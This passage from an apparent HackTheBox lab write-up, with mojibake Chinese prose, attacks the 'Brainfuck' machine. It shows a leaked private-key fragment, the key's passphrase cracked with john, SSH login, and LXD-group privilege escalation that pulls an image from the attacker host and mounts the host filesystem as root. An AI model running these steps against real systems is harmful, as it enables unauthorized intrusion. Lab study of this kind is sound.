CI57axBQBqThEg/HTCy\nIQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF\nmxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP\nCvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF\n9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS\nEBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi\n6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ\n-----END RSA PRIVATE KEY-----\n```\nç„¶åæˆ‘ä»¬å¾—åˆ°äº†ç§é’¥ï¼Œä½†æ˜¯ä¼¼ä¹æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬è¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh2john id_rsa > id_rsa_decode     \n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_decode \nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n3poulakia!       (id_rsa)     \n1g 0:00:00:03 DONE (2023-01-19 15:20) 0.3095g/s 3857Kp/s 3857Kc/s 3857KC/s 3prash0..3pornuthin\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nå¾—åˆ°äº†ç§é’¥çš„å¯†ç \n\n```bash\n3poulakia!\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh orestis@10.10.10.17 -i id_rsa\nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nYou have mail.\nLast login: Mon Oct  3 19:41:38 2022 from 10.10.14.23\norestis@brainfuck:~$ id&&whoami\norestis@brainfuck:~$ whoami&&id\norestis\nuid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)\n```\næˆåŠŸå¾—åˆ° user æƒé™\n\n```bash\norestis@brainfuck:~$ cat user.txt \n2c11cfbc5b959f73ac15a3310bd097c9\n```\næˆåŠŸå¾—åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\né€šè¿‡ä¸Šé¢çš„ id æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰ç”¨æˆ·åœ¨ lxd æƒé™ç»„ä¸­\n\n> [https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)\n\né€šè¿‡æœç´¢ lxd æ‰¾åˆ°äº†ä¸€ä¸ª exploit\n\n## Step 1\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine\n--2023-01-19 15:28:34--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine\næ­£åœ¨è§£æä¸»æœº raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8002::154, ...\næ­£åœ¨è¿æ¥ raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK\né•¿åº¦ï¼š8060 (7.9K) [text/plain]\næ­£åœ¨ä¿å­˜è‡³: â€œbuild-alpineâ€\n\nbuild-alpine                                         100%[=====================================================================================================================>]   7.87K  --.-KB/s  ç”¨æ—¶ 0s      \n\n2023-01-19 15:28:35 (27.1 MB/s) - å·²ä¿å­˜ â€œbuild-alpineâ€ [8060/8060])\n```\né¦–å…ˆä¸‹è½½ build-alpine\n\n## Step 2\næ¥ç€è¿è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ./build-alpine \nDetermining the latest release... v3.17\nUsing static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64\nDownloading alpine-keys-2.4-r1.apk\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\nDownloading apk-tools-static-2.12.10-r1.apk\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\ntar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™\nalpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: æˆåŠŸ\nVerified OK\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2527  100  2527    0     0    740      0  0:00:03  0:00:03 --:--:--   741\n--2023-01-19 15:38:57--  http://alpine.mirror.wearetriple.com/MIRRORS.txt\næ­£åœ¨è§£æä¸»æœº alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 2a00:1f00:dc06:10::106, 93.187.10.106\næ­£åœ¨è¿æ¥ alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::106|:80... å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK\né•¿åº¦ï¼š2527 (2.5K) [text/plain]\næ­£åœ¨ä¿å­˜è‡³: â€œ/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txtâ€\n\n/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRROR 100%[=====================================================================================================================>]   2.47K  --.-KB/s  ç”¨æ—¶ 0s      \n\n2023-01-19 15:39:00 (77.3 MB/s) - å·²ä¿å­˜ â€œ/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txtâ€ [2527/2527])\n\nSelecting mirror http://mirror.clarkson.edu/alpine//v3.17/main\nfetch http://mirror.clarkson.edu/alpine//v3.17/main/x86_64/APKINDEX.tar.gz\n(1/25) Installing alpine-baselayout-data (3.4.0-r0)\n(2/25) Installing musl (1.2.3-r4)\n(3/25) Installing busybox (1.35.0-r29)\nExecuting busybox-1.35.0-r29.post-install\n(4/25) Installing busybox-binsh (1.35.0-r29)\n(5/25) Installing alpine-baselayout (3.4.0-r0)\nExecuting alpine-baselayout-3.4.0-r0.pre-install\nExecuting alpine-baselayout-3.4.0-r0.post-install\n(6/25) Installing ifupdown-ng (0.12.1-r1)\n(7/25) Installing libcap2 (2.66-r0)\n(8/25) Installing openrc (0.45.2-r7)\nExecuting openrc-0.45.2-r7.post-install\n(9/25) Installing mdev-conf (4.3-r0)\n(10/25) Installing busybox-mdev-openrc (1.35.0-r29)\n(11/25) Installing alpine-conf (3.15.0-r0)\n(12/25) Installing alpine-keys (2.4-r1)\n(13/25) Installing alpine-release (3.17.1-r0)\n(14/25) Installing ca-certificates-bundle (20220614-r4)\n(15/25) Installing libcrypto3 (3.0.7-r2)\n(16/25) Installing libssl3 (3.0.7-r2)\n(17/25) Installing ssl_client (1.35.0-r29)\n(18/25) Installing zlib (1.2.13-r0)\n(19/25) Installing apk-tools (2.12.10-r1)\n(20/25) Installing busybox-openrc (1.35.0-r29)\n(21/25) Installing busybox-suid (1.35.0-r29)\n(22/25) Installing scanelf (1.3.5-r1)\n(23/25) Installing musl-utils (1.2.3-r4)\n(24/25) Installing libc-utils (0.7.2-r3)\n(25/25) Installing alpine-base (3.17.1-r0)\nExecuting busybox-1.35.0-r29.trigger\nOK: 10 MiB in 25 packages\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ls\n alpine-v3.17-x86_64-20230119_1539.tar.gz\n```\nå¤šäº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶\n\n## Step 3\nä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\n## Step 4\nåœ¨é¶æœºä¸­ä½¿ç”¨ wget ä¸‹è½½ï¼Œç„¶åè¿è¡Œ\n\n```bash\norestis@brainfuck:~$ wget http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz\n--2023-01-19 09:41:24--  http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz\nConnecting to 10.10.16.11:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3792999 (3.6M) [application/gzip]\nSaving to: â€˜alpine-v3.17-x86_64-20230119_1539.tar.gzâ€™\n\nalpine-v3.17-x86_64-20230119_1539.tar.gz             100%[=====================================================================================================================>]   3.62M   810KB/s    in 11s     \n\n2023-01-19 09:41:37 (328 KB/s) - â€˜alpine-v3.17-x86_64-20230119_1539.tar.gzâ€™ saved [3792999/3792999]\n```\n```bash\norestis@brainfuck:~$ lxc image import alpine-v3.17-x86_64-20230119_1539.tar.gz --alias test\nGenerating a client certificate. This may take a minute...\nIf this is your first time using LXD, you should also run: sudo lxd init\nTo start your first container, try: lxc launch ubuntu:16.04\n\nImage imported with fingerprint: 2f15d7d049eb4ce507a0ec903b690f37e78c2166c9d6fd062dbfed81b3816467\norestis@brainfuck:~$ lxc image list\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| test  | 2f15d7d049eb | no     | alpine v3.17 (20230119_15:39) | x86_64 | 3.62MB | Jan 19, 2023 at 7:43am (UTC) |\n+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n```\nå·²ç»è¿è¡ŒæˆåŠŸäº†ï¼Œå’±ä»¬å»ç»§ç»­åˆ©ç”¨\n\n```bash\nlxc init test test -c security.privileged=true # åˆå§‹åŒ–é•œåƒ\nlxc config device add test test disk source=/ path=/mnt/root recursive=true # æŒ‚è½½ç£ç›˜\nlxc start test # å¯åŠ¨é•œåƒ\nlxc exec test /bin/sh # è¿›å…¥é•œåƒ\n```\n```bash\norestis@brainfuck:~$ lxc exec test /bin/sh\n~ # whoami&&id\nroot\nuid=0(root) gid=0(root)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™\n\n```bash\n~ # cat /mnt/root/root/root.txt\n6efc1a5dbb8904751ce6566a305bb8ef\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]}]